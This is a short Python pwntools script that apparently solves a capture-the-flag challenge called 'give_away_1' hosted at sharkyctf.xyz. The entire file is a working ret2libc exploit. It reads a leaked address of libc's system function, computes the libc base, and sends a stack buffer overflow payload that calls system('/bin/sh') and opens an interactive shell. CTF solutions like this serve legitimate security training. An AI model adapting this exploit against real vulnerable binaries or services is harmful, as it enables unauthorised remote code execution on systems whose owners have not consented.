#!/usr/bin/python3 

from pwn import *

#p = process('./give_away_1')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = remote('sharkyctf.xyz', 20334)
libc = ELF('libc-2.27.so')

p.recvuntil('Give away: ')
system = eval(p.recvline().strip())
print(hex(system))
libcbase = system - libc.symbols['system']
print('libcbase: ' + hex(libcbase))

payload  = 0x24 * b'A'
payload += p32(system)
payload += p32(0x0)
payload += p32(libcbase + next(libc.search(b"/bin/sh")))

p.sendline(payload)
p.interactive()
